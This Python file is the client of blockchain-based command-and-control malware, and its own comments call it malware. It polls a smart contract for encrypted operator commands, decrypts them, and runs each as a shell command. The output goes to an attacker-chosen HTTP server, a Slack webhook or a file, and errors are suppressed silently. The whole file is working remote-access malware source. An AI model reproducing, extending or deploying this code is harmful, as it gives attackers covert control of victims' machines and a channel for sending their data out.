import os
import sys
import json
import time
import requests
import subprocess
import configparser
from web3 import Web3
from pathlib import Path
from cryptography.fernet import Fernet

# Parse config file
config = configparser.ConfigParser()
config.read('client.conf')

def load_contract():
    # Define and connect a new Web3 provider
    w3 = Web3(Web3.HTTPProvider(config['DEFAULT']['Web3ProviderUri']))

    # Load ABI
    with open(Path('../contracts/bloc2_abi.json')) as f:
        bloc2_abi = json.load(f)

    # Get the contract
    contract_address = config['DEFAULT']['SmartContractAddress']
    contract = w3.eth.contract(
        address=contract_address,
        abi=bloc2_abi
    )
    # Return the contract from the function
    return contract

def decrypt_command(data):
    # Grab encryption key from config file and decrypt the supplied data
    encryption_key = config['DEFAULT']['CommandEncryptionPassword']
    fernet = Fernet(encryption_key)
    decrypted_data = fernet.decrypt(data)
    return decrypted_data

def http_server_postback(postback_uri, results):
    # Build HTTP server's expected postback format
    postback_json = {
        'command': ' '.join(results.args),
        'returncode': results.returncode,
        'stdout': results.stdout,
        'stderr': results.stderr,
    }

    # Send results to HTTP server
    requests.post(postback_uri, json=postback_json)

def slack_postback(postback_uri, results):
    # Build response text
    text = f'*Command*: `{" ".join(results.args)}`\n'
    text+= f'*Return Code*: *{results.returncode}*\n'
    text+= f'*STDOUT*: {results.stdout}\n'
    text+= f'*STDERR*: {results.stderr}\n'

    # Build Slack's expected postback format
    postback_json = {'text': text}

    # Send results to Slack webhoook
    requests.post(postback_uri, json=postback_json)

def handle_command(event):
    try:
        # Decrypt command and load as JSON dictionary
        decrypted_json = json.loads(decrypt_command(event['args']['data']).decode())

        # Parse JSON
        client_id = decrypted_json['client_id']
        command = decrypted_json['command']
        response_type = decrypted_json['response_type']
        response_dest = decrypted_json['response_dest']

        # If command is meant for all clients, or this malware client specifically
        if (client_id == 0) or (client_id == config['DEFAULT']['MalwareClientID']):
            print(f'DEBUG: Found command for Malware ID: {client_id}')
            print(f'DEBUG: Executing command {command}')
            print(f'DEBUG: Sending results to {response_dest}')

            # Execute the command and then send results to the correct destination
            if response_type == '/dev/null':
                subprocess.run(command.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif response_type == 'local_file':
                results = subprocess.run(command.split(), capture_output=True)
                with open(response_dest, 'wb') as f:
                    f.write(results.stdout)
                    f.write(results.stderr)
            elif response_type == 'http_server':
                results = subprocess.run(command.split(), capture_output=True, text=True)
                http_server_postback(response_dest, results)
            elif response_type == 'slack_postback':
                results = subprocess.run(command.split(), capture_output=True, text=True)
                slack_postback(response_dest, results)
            elif response_type == 'blockchain':
                results = subprocess.run(command.split(), capture_output=True, text=True)

    except Exception as e:
        pass

def load_existing_commands(contract):
    # Process commands that already exist on the blockchain
    event_filter = contract.events.Command.createFilter(fromBlock='earliest')
    events = event_filter.get_all_entries()
    for event in events:
        handle_command(event)

def load_new_commands(contract):
    # Poll the blockchain for new commands issued by the operator
    poll_interval = int(config['DEFAULT']['PollInterval'])
    event_filter = contract.events.Command.createFilter(fromBlock='latest')
    while True:
        for event in event_filter.get_new_entries():
            handle_command(event)
        time.sleep(poll_interval)


def main(args):

    # Load the contract
    contract = load_contract()

    # Find and execute commands already on the blockchain
    load_existing_commands(contract)

    # Poll the blockchain for new commands issued by the malware operator
    load_new_commands(contract)

if __name__ == '__main__':
  sys.exit(main(sys.argv[1:]))
